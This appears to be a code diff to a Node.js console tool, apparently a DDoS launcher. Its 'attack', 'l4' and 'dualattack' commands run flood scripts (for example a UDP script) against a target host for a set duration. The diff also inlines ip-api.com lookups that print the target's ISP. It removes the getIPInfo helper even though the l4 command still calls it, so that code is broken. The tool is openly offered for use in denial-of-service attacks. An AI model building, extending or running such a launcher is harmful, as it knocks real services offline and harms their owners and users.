@@ -45,16 +45,6 @@ const rl = readline.createInterface({
     prompt: '[Dir Console]: '
 });
 
-const getIPInfo = async (target) => {
-    try {
-        const response = await axios.get(`http://ip-api.com/json/${target}`);
-        return response.data;
-    } catch (error) {
-        console.error('Error fetching IP info:', error);
-        return null;
-    }
-};
-
 const commands = {
     attack: async (method, target, duration) => {
         let command;
@@ -81,20 +71,23 @@ const commands = {
             }
             console.log(stdout);
 
-            // Mendapatkan informasi IP dan ISP
-            const info = await getIPInfo(target);
-            if (info) {
-                console.log(`Target: ${info.query}`);
-                console.log(`ISP: ${info.isp}`);
-                console.log(`Duration: ${duration}`);
-            }
+            // Mendapatkan informasi IP dan ISP   
+            const parsing = new url.URL(target)
+            const hostname = parsing.hostname
+            const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
+            const result = scrape.data;
+            console.clear()
+            console.log(`Target: ${result.query}`);
+            console.log(`ISP: ${result.isp}`);
+            console.log(`Duration: ${duration}`);
+            console.log(`Methods: ${method}`);
         });
     },
     l4: async (method, target, port, duration) => {
         let command;
         switch (method) {
             case 'udp':
-                command = `node src/l7/udp.js ${target} ${port} ${duration}`;
+                command = `node src/l4/udp.js ${target} ${port} ${duration}`;
                 break;
             // Tambahkan methods lain di sini
             default:
@@ -112,10 +105,10 @@ const commands = {
             // Mendapatkan informasi IP dan ISP
             const info = await getIPInfo(target);
             if (info) {
-                console.log(`IP: ${info.query}`);
+                console.log(`IP: ${target}`);
                 console.log(`Port: ${port}`);
                 console.log(`Duration: ${duration}`);
-                console.log(`ISP: ${info.isp}`);
+                console.log(`Methods: ${method}`); 
             }
         });
     },
@@ -138,19 +131,20 @@ const commands = {
             }
             console.log(`Command2 output: \n${stdout}`);
         });
-
-        // Mendapatkan informasi IP dan ISP
-        const info = await getIPInfo(target);
-        if (info) {
-            console.log(`Target: ${info.query}`);
-            console.log(`ISP: ${info.isp}`);
+            const parsing = new url.URL(target)
+            const hostname = parsing.hostname
+            const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
+            const result = scrape.data;
+            console.clear()
+            console.log(`Target: ${result.query}`);
+            console.log(`ISP: ${result.isp}`);
             console.log(`Duration: ${duration}`);
-        }
+            console.log(`Methods: ${method}`); 
     },
     help: () => {
         console.log('Available commands:');
         console.log('attack <method> <target> <duration>');
-        console.log('l4 <target> <port> <duration>');
+        console.log('l4 <method> <target> <port> <duration>');
         console.log('dualattack <target> <duration>');
         console.log('help');
     }
